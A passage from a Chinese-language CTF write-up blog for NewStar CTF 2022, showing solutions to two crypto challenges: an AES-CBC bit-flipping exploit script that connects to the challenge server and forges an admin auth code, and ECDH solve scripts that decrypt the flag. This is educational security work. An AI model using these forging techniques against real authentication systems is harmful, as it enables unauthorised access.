</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>auth_pt</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;NewStarCTFer____&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Have fun!!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Who are you?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;ByeBye&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;WTF&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p><a href=https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/ target=_blank rel="noopener noreffer">CBC Bit-Flipping Attack Conclusion · Automne&rsquo;s Shadow (ce-automne.github.io)</a></p><p>AES CBC 模式的字节翻转攻击(CBC Bit-Flipping Attack)</p><p>CBC是分组加密，前一组密文与这一组明文异或，第一组明文与偏移向量iv异或；解密类似
前一组密文翻转某一字节，这一组明文对应字节翻转</p><p>按字节将前一组密文xor原明文xor需要的明文，则解密后可得到需要的明文</p><p>AAB = B</p><p>本题只有一组，直接将iv各个字节异或</p><p>exp：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnlib.tubes.remote</span> <span class=kn>import</span> <span class=n>remote</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 字节翻转攻击</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>new_code</span><span class=p>(</span><span class=n>authcode</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>auth_pt</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;NewStarCTFer____&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>auth_pt2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;AdminAdmin______&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>user_key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>authcode</span><span class=p>)[:</span><span class=mi>16</span><span class=p>]</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>code</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>authcode</span><span class=p>)[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>newuser_key</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>user_key</span><span class=p>[</span><span class=mi>2</span><span class=o>*</span><span class=n>i</span><span class=p>:</span><span class=mi>2</span><span class=o>*</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span><span class=o>^</span><span class=n>auth_pt</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=n>auth_pt2</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>newuser_key</span> <span class=o>+=</span> <span class=n>k</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>new_code</span> <span class=o>=</span> <span class=n>newuser_key</span> <span class=o>+</span> <span class=n>code</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>new_code</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 远程连接</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;node4.buuoj.cn&#34;</span><span class=p>,</span><span class=mi>29929</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>re</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>authocode</span> <span class=o>=</span> <span class=n>re</span><span class=p>[</span><span class=n>index</span><span class=o>+</span><span class=mi>2</span><span class=p>:</span><span class=n>index</span><span class=o>+</span><span class=mi>66</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>admincode</span> <span class=o>=</span> <span class=n>new_code</span><span class=p>(</span><span class=n>authocode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>re</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>admincode</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>re</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>re</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><h4 id=an-der-schönen-elliptische-kurve>An der schönen Elliptische Kurve</h4><p>task.sage：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>FLAG</span><span class=p>,</span> <span class=n>ECDH_KEY_EXCHANGE</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>os</span> <span class=kn>import</span> <span class=n>urandom</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>14489</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mi>10289</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>F</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>E</span> <span class=o>=</span> <span class=n>EllipticCurve</span><span class=p>(</span><span class=n>F</span><span class=p>,</span> <span class=p>[</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>=</span> <span class=n>E</span><span class=o>.</span><span class=n>random_point</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>my_private_key</span> <span class=o>=</span> <span class=n>random_prime</span><span class=p>(</span><span class=mi>2</span><span class=o>^</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shared</span><span class=p>,</span> <span class=n>sender_public_key</span> <span class=o>=</span> <span class=n>ECDH_KEY_EXCHANGE</span><span class=p>(</span><span class=n>G</span><span class=p>,</span> <span class=n>my_private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>shared</span><span class=o>.</span><span class=n>xy</span><span class=p>()[</span><span class=mi>0</span><span class=p>]))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ciphretext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>FLAG</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sender_public_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>my_private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ciphretext</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>iv</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span></code></pre></div><p>output.txt：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=m>14489</span>
</span></span><span class=line><span class=cl><span class=m>10289</span>
</span></span><span class=line><span class=cl><span class=m>7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661</span>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207</span> : <span class=m>1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459</span> : 1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>2549545681219766023689977461986014915946503806253877534915175093306317852773</span>
</span></span><span class=line><span class=cl>2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23
</span></span><span class=line><span class=cl>d151c04c645c3e2a8d3f1ae44589ef20
</span></span></code></pre></div><p>ECDH
<a href=https://www.cnblogs.com/xiaolincoding/p/14318338.html target=_blank rel="noopener noreffer">图解 ECDHE 密钥交换算法 - 小林coding - 博客园 (cnblogs.com)</a></p><p>类似DH，先创建椭圆曲线GF(p)和G，A和B双方选择a和b，得到各自公钥a<em>G和b</em>G，发送后得到共享私钥a<em>b</em>G</p><p>本题给了B的公钥和a直接创建椭圆曲线，令G = B的公钥，则私钥 = G*a</p><p>exp.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tinyec.ec</span> <span class=k>as</span> <span class=nn>ec</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>14489</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mi>10289</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661</span>
</span></span><span class=line><span class=cl><span class=n>sender_public_key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207</span><span class=p>,</span> <span class=mi>1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>my_private_key</span> <span class=o>=</span> <span class=mi>2549545681219766023689977461986014915946503806253877534915175093306317852773</span>
</span></span><span class=line><span class=cl><span class=c1># ECDH</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>ec</span><span class=o>.</span><span class=n>SubGroup</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>g</span><span class=o>=</span><span class=p>(</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>1</span><span class=p>]),</span><span class=n>n</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span><span class=n>h</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>ec</span><span class=o>.</span><span class=n>Curve</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>field</span><span class=o>=</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>publi_key</span> <span class=o>=</span> <span class=n>ec</span><span class=o>.</span><span class=n>Point</span><span class=p>(</span><span class=n>curve</span><span class=o>=</span><span class=n>c</span><span class=p>,</span><span class=n>x</span><span class=o>=</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>y</span><span class=o>=</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>shared</span> <span class=o>=</span> <span class=n>my_private_key</span><span class=o>*</span><span class=n>publi_key</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>publi_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>shared</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># AES</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=s2>&#34;2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23&#34;</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=s2>&#34;d151c04c645c3e2a8d3f1ae44589ef20&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>shared</span><span class=o>.</span><span class=n>x</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div><p>sage在线：<a href=https://cocalc.com/projects target=_blank rel="noopener noreffer">Projects - CoCalc</a>
exp.sage：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>14489</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mi>10289</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661</span>
</span></span><span class=line><span class=cl><span class=n>my_private_key</span> <span class=o>=</span> <span class=mi>2549545681219766023689977461986014915946503806253877534915175093306317852773</span>
</span></span><span class=line><span class=cl><span class=n>sender_public_key</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207</span><span class=p>,</span> <span class=mi>1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>F</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>E</span> <span class=o>=</span> <span class=n>EllipticCurve</span><span class=p>(</span><span class=n>F</span><span class=p>,[</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>G</span> <span class=o>=</span> <span class=n>E</span><span class=p>(</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>sender_public_key</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=p>(</span><span class=n>G</span><span class=o>*</span><span class=n>my_private_key</span><span class=p>)</span><span class=o>.</span><span class=n>xy</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=s2>&#34;2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23&#34;</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=s2>&#34;d151c04c645c3e2a8d3f1ae44589ef20&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>iv</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-09-10</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/newstar2022/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://githubmof.github.io/newstar2022/ data-title=newstar2022 data-hashtags=ctf><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://githubmof.github.io/newstar2022/ data-hashtag=ctf><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>ctf</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/%E5%B0%8F%E6%B8%B8%E6%88%8F/ class=prev rel=prev title=小游戏><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>小游戏</a>
<a href=/mtctf2022/ class=next rel=next title=MTCTF2022>MTCTF2022<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><span id=run-time></span></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://github.com/githubmof target=_blank>mof</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><div class=sidebar_wo><div id=leimu><img src=/images/sidebar_wo/leimuA.png alt=雷姆 onmouseover=/images/sidebar_wo/leimuB.png onmouseout=/images/sidebar_wo/leimuA.png title=回到顶部></div><div class=sidebar_wo id=lamu><img src=/images/sidebar_wo/lamuA.png alt=雷姆 onmouseover=/images/sidebar_wo/lamuB.png onmouseout=/images/sidebar_wo/lamuA.png title=回到底部></div></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"06C5J0ZYUN",algoliaIndex:"githubmof",algoliaSearchKey:"a3cde6a74f0166767bdda9dbe2235fdb",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js></script>
<script type=text/javascript src=https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js></script><script type=text/javascript src=/js/custom.js></script></body></html>